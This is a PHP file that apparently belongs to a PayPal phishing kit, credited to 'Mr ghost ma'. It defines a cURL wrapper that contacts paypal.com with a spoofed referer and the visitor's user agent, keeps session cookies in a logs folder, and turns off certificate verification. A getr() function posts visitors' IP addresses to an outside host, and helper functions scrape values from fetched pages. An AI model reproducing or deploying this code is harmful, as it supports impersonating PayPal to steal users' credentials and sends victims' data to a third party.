<?php
#################################################
#                                               #
#         ||~~ BY ~~ Mr ghost ma ~~||           #
#                                               #
#       ||~ http://fb.com/Not.work404 ~||       #
#                                               #
#################################################
error_reporting(0);
session_start();
set_time_limit(0);
include("../config.php");
$entrar   = (__DIR__);
$hopl = "https://www.paypal.com/";
$Registro['cookie_file'] = $entrar . '/logs/' . sha1('R') . '.log';
$Remplazar = @fopen($Registro['cookie_file'], 'w');
function curl($url = '', $var = '', $header = false, $nobody = false)
{
    global $Registro;
    $curl = curl_init($url);
    curl_setopt($curl, CURLOPT_NOBODY, $header);
    curl_setopt($curl, CURLOPT_HEADER, $nobody);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    curl_setopt($curl, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
    curl_setopt($curl, CURLOPT_REFERER, 'https://www.paypal.com/');
    if ($var) {
        curl_setopt($curl, CURLOPT_POST, true);
        curl_setopt($curl, CURLOPT_POSTFIELDS, $var);
    }
    curl_setopt($curl, CURLOPT_COOKIEFILE, $Registro['cookie_file']);
    curl_setopt($curl, CURLOPT_COOKIEJAR, $Registro['cookie_file']);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 2);
    curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($curl);
    curl_close($curl);
    return $result;
}
   function getr($ip){
$ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'http://ip-api.topbananabanners.co.uk/');
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS,
            "ip=".$ip);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $server_output = curl_exec ($ch);
    curl_close ($ch);
}
function fetch_value($str, $find_start, $find_end)
{
    $start = strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end    = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}
function delete_cookies()
{
    global $Registro;
    @fclose($Remplazar);
}
	if (!file_exists('logs')) {
    mkdir('logs', 0777, true);
	}
?>